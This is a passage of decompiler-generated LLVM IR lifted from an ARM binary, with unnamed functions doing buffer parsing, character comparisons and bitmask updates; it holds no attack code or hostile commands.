  %v1_8bf8 = icmp slt i32 %v3_8bf0, 0
  store i1 %v1_8bf8, i1* %cpsr_n.global-to-local, align 1
  %v2_8bf8 = icmp eq i32 %v3_8bf0, 0
  store i1 %v2_8bf8, i1* %cpsr_z.global-to-local, align 1
  %v0_8bfc = load i32, i32* @r5, align 4
  store i32 %v0_8bfc, i32* %stack_var_-40, align 4
  %tmp209 = icmp slt i32 %v3_8bf0, 1
  br i1 %tmp209, label %dec_label_pc_8c60, label %dec_label_pc_8c04

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bd8, %dec_label_pc_8c04
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c08 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_8c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_8c18 = and i32 %v3_8c10, 33554432
  %v2_8c18 = icmp ne i32 %v1_8c18, 0
  store i1 %v2_8c18, i1* %cpsr_c.global-to-local, align 1
  %v3_8c18 = mul i32 %v3_8c10, 128
  %v1_8c1c = add i32 %v3_8c18, 1472
  %v2_8c20 = add i32 %v2_8c08, %stack_var_-20856.0.ph
  store i32 %v2_8c20, i32* @r0, align 4
  %v0_8c24 = load i32, i32* @r7, align 4
  %v2_8c24 = add i32 %v1_8c1c, %v0_8c24
  store i32 %v2_8c24, i32* %r1.global-to-local, align 4
  %v2_8c28 = inttoptr i32 %v2_8c20 to i8*
  %v3_8c28 = call i32 @function_12d04(i8* %v2_8c28, i32 %v2_8c24)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c30 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f70.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8c3c = add i32 %v2_8c30, %stack_var_-20856.0.ph
  store i32 %v2_8c3c, i32* @r0, align 4
  %v3_8c40 = inttoptr i32 %v2_8c3c to i8*
  %v4_8c40 = call i32 @function_12d04(i8* %v3_8c40, i32 ptrtoint ([3 x i8]* @global_var_15f70.38 to i32))
  store i32 %v4_8c40, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_8c48 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8c48, i32* %r3.global-to-local, align 4
  %v0_8c4c = load i32, i32* @r6, align 4
  %v1_8c4c = add i32 %v0_8c4c, 37
  %v2_8c4c = inttoptr i32 %v1_8c4c to i32*
  %v3_8c4c = load i32, i32* %v2_8c4c, align 4
  store i32 %v3_8c4c, i32* %r2.global-to-local, align 4
  %v1_8c50 = add i32 %v3_8c48, 1
  store i32 %v1_8c50, i32* %ip.global-to-local, align 4
  %v2_8c54 = sub i32 %v3_8c4c, %v1_8c50
  %v3_8c54 = icmp uge i32 %v3_8c4c, %v1_8c50
  store i1 %v3_8c54, i1* %cpsr_c.global-to-local, align 1
  %v4_8c54 = xor i32 %v3_8c4c, %v1_8c50
  %v5_8c54 = xor i32 %v2_8c54, %v3_8c4c
  %v6_8c54 = and i32 %v5_8c54, %v4_8c54
  %v7_8c54 = icmp slt i32 %v6_8c54, 0
  store i1 %v7_8c54, i1* %cpsr_v.global-to-local, align 1
  %v8_8c54 = icmp slt i32 %v2_8c54, 0
  store i1 %v8_8c54, i1* %cpsr_n.global-to-local, align 1
  %v9_8c54 = icmp eq i32 %v3_8c4c, %v1_8c50
  store i1 %v9_8c54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c50, i32* %stack_var_-40, align 4
  %v8_8c5c = icmp sgt i32 %v3_8c4c, %v1_8c50
  br i1 %v8_8c5c, label %dec_label_pc_8c04, label %dec_label_pc_8c60

dec_label_pc_8c60:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8bd8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c64 = call i32 @function_12cdc(i8* %v1_8940)
  %v2_8c6c = add i32 %v2_8c64, %stack_var_-20856.0.ph
  store i32 %v2_8c6c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8c74 = inttoptr i32 %v2_8c6c to i8*
  %v4_8c74 = call i32 @function_12d04(i8* %v3_8c74, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 %v4_8c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c78

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8bcc, %dec_label_pc_8c60
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c7c = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8c88 = add i32 %v2_8c7c, %stack_var_-20856.0.ph
  store i32 %v2_8c88, i32* @r0, align 4
  %v3_8c8c = inttoptr i32 %v2_8c88 to i8*
  %v4_8c8c = call i32 @function_12d04(i8* %v3_8c8c, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 %v4_8c8c, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_8c94, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_8c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c94, label %dec_label_pc_8cb4, label %dec_label_pc_8c9c

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c78
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ca0 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v2_8cac = add i32 %v2_8ca0, %stack_var_-20856.0.ph
  store i32 %v2_8cac, i32* @r0, align 4
  %v2_8cb0 = inttoptr i32 %v2_8cac to i8*
  %v3_8cb0 = call i32 @function_12d04(i8* %v2_8cb0, i32 %v6_8200)
  store i32 %v3_8cb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c78, %dec_label_pc_8c9c
  %v0_8cb4 = load i32, i32* @r7, align 4
  %v1_8cb4 = add i32 %v0_8cb4, 1440
  store i32 %v1_8cb4, i32* %r4.global-to-local, align 4
  %v0_8cb8 = load i32, i32* @r6, align 4
  store i32 %v0_8cb8, i32* %r0.global-to-local, align 4
  store i32 %v1_8cb4, i32* %r1.global-to-local, align 4
  %v2_8cc0 = inttoptr i32 %v0_8cb8 to i8*
  %v3_8cc0 = call i32 @function_130bc(i8* %v2_8cc0, i32 %v1_8cb4)
  store i32 %v3_8cc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8cc4 = icmp slt i32 %v3_8cc0, 0
  store i1 %v1_8cc4, i1* %cpsr_n.global-to-local, align 1
  %v2_8cc4 = icmp eq i32 %v3_8cc0, 0
  store i1 %v2_8cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8cc4, label %dec_label_pc_960c, label %dec_label_pc_8ccc

dec_label_pc_8ccc:                                ; preds = %dec_label_pc_8cb4, %dec_label_pc_960c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8cd0 = load i32, i32* @r6, align 4
  %v1_8cd0 = add i32 %v0_8cd0, -1431
  %v2_8cd0 = inttoptr i32 %v1_8cd0 to i32*
  %v3_8cd0 = load i32, i32* %v2_8cd0, align 4
  store i32 %v3_8cd0, i32* @r4, align 4
  %v2_8cd4 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8cd4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ce4 = load i32, i32* @r4, align 4
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  %v5_8ce8 = call i32 @function_13f00(i32 %v0_8ce4, i32* %v4_8ce8, i32 %v2_8cd4, i32 16384)
  store i32 %v5_8ce8, i32* %r0.global-to-local, align 4
  %v0_8cec = load i32, i32* @r6, align 4
  %v1_8cec = add i32 %v0_8cec, -1431
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v3_8cec, i32* %r0.global-to-local, align 4
  %v3_8cf4 = udiv i32 %v3_8cec, 32
  %v3_8cf8 = mul nuw nsw i32 %v3_8cf4, 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8d00 = add i32 %v3_8cf8, %v2_8748
  store i32 %v2_8d00, i32* %r3.global-to-local, align 4
  %v1_8d04 = add i32 %v2_8d00, -164
  %v2_8d04 = inttoptr i32 %v1_8d04 to i32*
  %v3_8d04 = load i32, i32* %v2_8d04, align 4
  %v1_8d08 = urem i32 %v3_8cec, 32
  %v1_8d0c = load i32, i32* %fp.global-to-local, align 4
  %v7_8d0c = shl i32 %v1_8d0c, %v1_8d08
  %v8_8d0c = or i32 %v7_8d0c, %v3_8d04
  store i32 %v8_8d0c, i32* %r2.global-to-local, align 4
  %v0_8d10 = load i32, i32* @sl, align 4
  %v2_8d10 = sub i32 %v0_8d10, %v3_8cec
  %v3_8d10 = icmp uge i32 %v0_8d10, %v3_8cec
  store i1 %v3_8d10, i1* %cpsr_c.global-to-local, align 1
  %v4_8d10 = xor i32 %v0_8d10, %v3_8cec
  %v5_8d10 = xor i32 %v2_8d10, %v0_8d10
  %v6_8d10 = and i32 %v5_8d10, %v4_8d10
  %v7_8d10 = icmp slt i32 %v6_8d10, 0
  store i1 %v7_8d10, i1* %cpsr_v.global-to-local, align 1
  %v8_8d10 = icmp slt i32 %v2_8d10, 0
  store i1 %v8_8d10, i1* %cpsr_n.global-to-local, align 1
  %v9_8d10 = icmp eq i32 %v0_8d10, %v3_8cec
  store i1 %v9_8d10, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_8d0c, i32* %v2_8d04, align 4
  %v0_8d1c = load i32, i32* %sb.global-to-local, align 4
  %v1_8d1c = load i32, i32* @r6, align 4
  %v2_8d1c = add i32 %v1_8d1c, -1419
  %v3_8d1c = inttoptr i32 %v2_8d1c to i32*
  store i32 %v0_8d1c, i32* %v3_8d1c, align 4
  %v0_8d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d20 = trunc i32 %v0_8d20 to i8
  %v2_8d20 = load i32, i32* @r6, align 4
  %v3_8d20 = add i32 %v2_8d20, -1427
  %v4_8d20 = inttoptr i32 %v3_8d20 to i8*
  store i8 %v1_8d20, i8* %v4_8d20, align 1
  %v0_8d24 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_8d24 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_8d24 = xor i1 %v0_8d24, %v1_8d24
  br i1 %v2_8d24, label %dec_label_pc_8d28, label %dec_label_pc_8630

dec_label_pc_8d28:                                ; preds = %dec_label_pc_8ccc
  %v0_8d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d28 = add i32 %v0_8d28, 1
  store i32 %v1_8d28, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d30:                                ; preds = %dec_label_pc_8608
  %v1_8d30 = add i32 %v3_8900, -1431
  %v2_8d30 = inttoptr i32 %v1_8d30 to i32*
  %v3_8d30 = load i32, i32* %v2_8d30, align 4
  store i32 %v3_8d30, i32* %r0.global-to-local, align 4
  %v3_8d38 = udiv i32 %v3_8d30, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d3c = mul nuw nsw i32 %v3_8d38, 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8d44 = add i32 %v3_8d3c, %v2_8748
  store i32 %v2_8d44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8d48:                                ; preds = %.thread24, %.thread35, %dec_label_pc_8d30
  %v1_8d54 = phi i32 [ %v4_85ec, %.thread35 ], [ %v4_85cc, %.thread24 ], [ %v3_8d30, %dec_label_pc_8d30 ]
  %v1_8d58 = phi i32 [ %v3_8600, %.thread35 ], [ %v3_85e0, %.thread24 ], [ %v2_8d44, %dec_label_pc_8d30 ]
  %v1_8d48 = add i32 %v1_8d58, -164
  %v2_8d48 = inttoptr i32 %v1_8d48 to i32*
  %v3_8d48 = load i32, i32* %v2_8d48, align 4
  %v1_8d4c = urem i32 %v1_8d54, 32
  store i32 %v1_8d4c, i32* %r1.global-to-local, align 4
  %v1_8d50 = load i32, i32* %fp.global-to-local, align 4
  %v7_8d50 = shl i32 %v1_8d50, %v1_8d4c
  %v8_8d50 = or i32 %v7_8d50, %v3_8d48
  store i32 %v8_8d50, i32* %r2.global-to-local, align 4
  %v0_8d54 = load i32, i32* @sl, align 4
  %v2_8d54 = sub i32 %v0_8d54, %v1_8d54
  %v3_8d54 = icmp uge i32 %v0_8d54, %v1_8d54
  store i1 %v3_8d54, i1* %cpsr_c.global-to-local, align 1
  %v4_8d54 = xor i32 %v0_8d54, %v1_8d54
  %v5_8d54 = xor i32 %v2_8d54, %v0_8d54
  %v6_8d54 = and i32 %v5_8d54, %v4_8d54
  %v7_8d54 = icmp slt i32 %v6_8d54, 0
  store i1 %v7_8d54, i1* %cpsr_v.global-to-local, align 1
  %v8_8d54 = icmp slt i32 %v2_8d54, 0
  store i1 %v8_8d54, i1* %cpsr_n.global-to-local, align 1
  %v9_8d54 = icmp eq i32 %v0_8d54, %v1_8d54
  store i1 %v9_8d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d50, i32* %v2_8d48, align 4
  %v2_8d5c = xor i1 %v8_8d54, %v7_8d54
  br i1 %v2_8d5c, label %dec_label_pc_8d60, label %dec_label_pc_8630

dec_label_pc_8d60:                                ; preds = %dec_label_pc_8d48
  %v0_8d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d60 = add i32 %v0_8d60, 1
  store i32 %v1_8d60, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d68:                                ; preds = %dec_label_pc_85b8
  %v1_8d68 = add i32 %v3_8900, -1423
  %v2_8d68 = inttoptr i32 %v1_8d68 to i32*
  %v3_8d68 = load i32, i32* %v2_8d68, align 4
  %v1_8d6c = load i32, i32* %sb.global-to-local, align 4
  %v2_8d6c = sub i32 %v1_8d6c, %v3_8d68
  store i32 %v2_8d6c, i32* %r3.global-to-local, align 4
  %v1_8d70 = add i32 %v2_8d6c, -30
  %v2_8d70 = icmp ugt i32 %v2_8d6c, 29
  store i1 %v2_8d70, i1* %cpsr_c.global-to-local, align 1
  %v3_8d70 = sub i32 29, %v2_8d6c
  %v4_8d70 = and i32 %v3_8d70, %v2_8d6c
  %v5_8d70 = icmp slt i32 %v4_8d70, 0
  store i1 %v5_8d70, i1* %cpsr_v.global-to-local, align 1
  %v6_8d70 = icmp slt i32 %v1_8d70, 0
  store i1 %v6_8d70, i1* %cpsr_n.global-to-local, align 1
  %v7_8d70 = icmp eq i32 %v2_8d6c, 30
  store i1 %v7_8d70, i1* %cpsr_z.global-to-local, align 1
  %v2_8d74 = xor i1 %v7_8d70, true
  %v3_8d74 = and i1 %v2_8d70, %v2_8d74
  br i1 %v3_8d74, label %dec_label_pc_8618, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d68
  %v1_8d78 = add i32 %v3_8900, -1431
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  %v3_8d78 = load i32, i32* %v2_8d78, align 4
  store i32 %v3_8d78, i32* %r0.global-to-local, align 4
  %v3_8d80 = udiv i32 %v3_8d78, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d84 = mul nuw nsw i32 %v3_8d80, 4
  store i32 %v3_8d84, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_881c
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_8dd8 = call i32 @function_12d7c(i32 %v2_8280, i32 10240)
  store i32 %v2_8dd8, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_8de4 = load i32, i32* @r8, align 4
  %v1_8de4 = add i32 %v0_8de4, -1456
  %v2_8de4 = inttoptr i32 %v1_8de4 to i32*
  %v3_8de4 = load i32, i32* %v2_8de4, align 4
  store i32 %v3_8de4, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v5_8df0 = call i32 @function_13ea0(i32 %v3_8de4, i32* nonnull %stack_var_-20809, i32 10240, i32 16386)
  store i32 %v5_8df0, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8df8 = icmp slt i32 %v5_8df0, 0
  store i1 %v1_8df8, i1* %cpsr_n.global-to-local, align 1
  %v2_8df8 = icmp eq i32 %v5_8df0, 0
  store i1 %v2_8df8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp210 = icmp slt i32 %v5_8df0, 1
  br i1 %tmp210, label %dec_label_pc_9a7c, label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8dd0
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_8e14 = call i32 @function_12da0(i32 %v2_8280, i32 %v5_8df0, i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32 4)
  store i32 %v5_8e14, i32* %r0.global-to-local, align 4
  %v1_8e18 = add i32 %v5_8e14, 1
  %v2_8e18 = icmp eq i32 %v5_8e14, -1
  store i1 %v2_8e18, i1* %cpsr_c.global-to-local, align 1
  %v3_8e18 = sub i32 0, %v5_8e14
  %v4_8e18 = and i32 %v1_8e18, %v3_8e18
  %v5_8e18 = icmp slt i32 %v4_8e18, 0
  store i1 %v5_8e18, i1* %cpsr_v.global-to-local, align 1
  %v6_8e18 = icmp slt i32 %v1_8e18, 0
  store i1 %v6_8e18, i1* %cpsr_n.global-to-local, align 1
  %v7_8e18 = icmp eq i32 %v1_8e18, 0
  store i1 %v7_8e18, i1* %cpsr_z.global-to-local, align 1
  %v0_9914 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_8e18, label %dec_label_pc_9914, label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8e04, %dec_label_pc_9914
  store i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_9914, i32* %r1.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_8e30 = call i32 @function_12da0(i32 %v2_8280, i32 %v0_9914, i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32 4)
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8e3c = add i32 %v5_8e30, %v2_8748
  store i32 %v2_8e3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_8e44 = load i32, i32* @r6, align 4
  %v4_8e44 = add i32 %v3_8e44, %v2_8e3c
  %v5_8e44 = inttoptr i32 %v4_8e44 to i8*
  store i8 0, i8* %v5_8e44, align 1
  %v0_8e48 = load i32, i32* @r5, align 4
  store i32 %v0_8e48, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_8e50 = inttoptr i32 %v0_8e48 to i32*
  %v3_8e50 = call i32 @function_122cc(i32 46, i32* %v2_8e50)
  %v0_8e54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e54, i32* @r1, align 4
  store i32 %v3_8e50, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e60 = call i32 @function_13030(i8* %tmp199, i32 %v0_8e54, i32 %v3_8e50)
  store i32 %v4_8e60, i32* %r0.global-to-local, align 4
  %v1_8e64 = add i32 %v4_8e60, 1
  %v2_8e64 = icmp eq i32 %v4_8e60, -1
  store i1 %v2_8e64, i1* %cpsr_c.global-to-local, align 1
  %v3_8e64 = sub i32 0, %v4_8e60
  %v4_8e64 = and i32 %v1_8e64, %v3_8e64
  %v5_8e64 = icmp slt i32 %v4_8e64, 0
  store i1 %v5_8e64, i1* %cpsr_v.global-to-local, align 1
  %v6_8e64 = icmp slt i32 %v1_8e64, 0
  store i1 %v6_8e64, i1* %cpsr_n.global-to-local, align 1
  %v7_8e64 = icmp eq i32 %v1_8e64, 0
  store i1 %v7_8e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e64, label %.thread45, label %bb211

bb211:                                            ; preds = %dec_label_pc_8e20
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_8e6c = load i32, i32* @r8, align 4
  %v3_8e6c = add i32 %v2_8e6c, -4
  %v4_8e6c = inttoptr i32 %v3_8e6c to i32*
  store i32 2, i32* %v4_8e6c, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_8e20, %bb211
  %v0_8e70 = load i32, i32* @r5, align 4
  store i32 %v0_8e70, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_8e78 = inttoptr i32 %v0_8e70 to i32*
  %v3_8e78 = call i32 @function_122cc(i32 45, i32* %v2_8e78)
  %v0_8e7c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e7c, i32* @r1, align 4
  store i32 %v3_8e78, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e88 = call i32 @function_13030(i8* %tmp199, i32 %v0_8e7c, i32 %v3_8e78)
  store i32 %v4_8e88, i32* %r0.global-to-local, align 4
  %v1_8e8c = add i32 %v4_8e88, 1
  %v2_8e8c = icmp eq i32 %v4_8e88, -1
  store i1 %v2_8e8c, i1* %cpsr_c.global-to-local, align 1
  %v3_8e8c = sub i32 0, %v4_8e88
  %v4_8e8c = and i32 %v1_8e8c, %v3_8e8c
  %v5_8e8c = icmp slt i32 %v4_8e8c, 0
  store i1 %v5_8e8c, i1* %cpsr_v.global-to-local, align 1
  %v6_8e8c = icmp slt i32 %v1_8e8c, 0
  store i1 %v6_8e8c, i1* %cpsr_n.global-to-local, align 1
  %v7_8e8c = icmp eq i32 %v1_8e8c, 0
  store i1 %v7_8e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e8c, label %.thread46, label %bb212

bb212:                                            ; preds = %.thread45
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8e94 = load i32, i32* @r8, align 4
  %v3_8e94 = add i32 %v2_8e94, -4
  %v4_8e94 = inttoptr i32 %v3_8e94 to i32*
  store i32 1, i32* %v4_8e94, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb212
  %v0_8e98 = load i32, i32* @r5, align 4
  store i32 %v0_8e98, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8ea0 = load i32, i32* @r8, align 4
  %v2_8ea0 = inttoptr i32 %v1_8ea0 to i32*
  store i32 %v0_8e98, i32* %v2_8ea0, align 4
  %v2_8ea4 = inttoptr i32 %v0_8e98 to i32*
  %v3_8ea4 = call i32 @function_122cc(i32 44, i32* %v2_8ea4)
  %v0_8ea8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  store i32 %v3_8ea4, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8eb4 = call i32 @function_13030(i8* %tmp199, i32 %v0_8ea8, i32 %v3_8ea4)
  store i32 %v4_8eb4, i32* %r0.global-to-local, align 4
  %v1_8eb8 = add i32 %v4_8eb4, 1
  %v2_8eb8 = icmp eq i32 %v4_8eb4, -1
  store i1 %v2_8eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_8eb8 = sub i32 0, %v4_8eb4
  %v4_8eb8 = and i32 %v1_8eb8, %v3_8eb8
  %v5_8eb8 = icmp slt i32 %v4_8eb8, 0
  store i1 %v5_8eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_8eb8 = icmp slt i32 %v1_8eb8, 0
  store i1 %v6_8eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_8eb8 = icmp eq i32 %v1_8eb8, 0
  store i1 %v7_8eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8eb8, label %.thread47, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %.thread46
  %v0_8ec0 = load i32, i32* @r5, align 4
  store i32 %v0_8ec0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_8ec8 = inttoptr i32 %v0_8ec0 to i32*
  %v3_8ec8 = call i32 @function_122cc(i32 44, i32* %v2_8ec8)
  %v0_8ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ecc, i32* @r1, align 4
  store i32 %v3_8ec8, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8ed8 = call i32 @function_13030(i8* %tmp199, i32 %v0_8ecc, i32 %v3_8ec8)
  store i32 %v4_8ed8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8ee4 = add i32 %v4_8ed8, %v2_8748
  store i32 %v2_8ee4, i32* %r3.global-to-local, align 4
  %v1_8ee8 = load i32, i32* @r6, align 4
  %v2_8ee8 = add i32 %v1_8ee8, %v2_8ee4
  %v3_8ee8 = inttoptr i32 %v2_8ee8 to i8*
  %v4_8ee8 = load i8, i8* %v3_8ee8, align 1
  %v2_8ef0 = icmp ugt i8 %v4_8ee8, 31
  store i1 %v2_8ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8ef0 = icmp ult i8 %v4_8ee8, 32
  store i1 %v6_8ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_8ef0 = icmp eq i8 %v4_8ee8, 32
  store i1 %v7_8ef0, i1* %cpsr_z.global-to-local, align 1
  %v2_8ef8 = zext i1 %v7_8ef0 to i32
  %v2_8ef8.v4_8ed8 = add i32 %v2_8ef8, %v4_8ed8
  store i32 %v2_8ef8.v4_8ed8, i32* @r4, align 4
  %v2_8efc = add i32 %v2_8ef8.v4_8ed8, %v2_8280
  store i32 %v2_8efc, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8efc, i32* %r0.global-to-local, align 4
  %v1_8f08 = load i32, i32* %fp.global-to-local, align 4
  %v2_8f08 = sub i32 %v1_8f08, %v2_8ef8.v4_8ed8
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8f10 = call i32 @function_12da0(i32 %v2_8efc, i32 %v2_8f08, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_8f10, i32* %r0.global-to-local, align 4
  %v1_8f14 = add i32 %v5_8f10, 1
  %v2_8f14 = icmp eq i32 %v5_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v3_8f14 = sub i32 0, %v5_8f10
  %v4_8f14 = and i32 %v1_8f14, %v3_8f14
  %v5_8f14 = icmp slt i32 %v4_8f14, 0
  store i1 %v5_8f14, i1* %cpsr_v.global-to-local, align 1
  %v6_8f14 = icmp slt i32 %v1_8f14, 0
  store i1 %v6_8f14, i1* %cpsr_n.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v1_8f14, 0
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8f10, i32* %r2.global-to-local, align 4
  br i1 %v7_8f14, label %.thread47, label %dec_label_pc_8f20

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8ec0
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_8f28 = load i32, i32* @r4, align 4
  %v2_8f28 = add i32 %v1_8f28, %v2_8748
  %v1_8f2c = add i32 %v5_8f10, -1
  %v2_8f2c = icmp ne i32 %v5_8f10, 0
  store i1 %v2_8f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f2c = sub i32 0, %v5_8f10
  %v4_8f2c = and i32 %v5_8f10, %v3_8f2c
  %v5_8f2c = icmp slt i32 %v4_8f2c, 0
  store i1 %v5_8f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f2c = icmp slt i32 %v1_8f2c, 0
  store i1 %v6_8f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f2c = icmp eq i32 %v5_8f10, 1
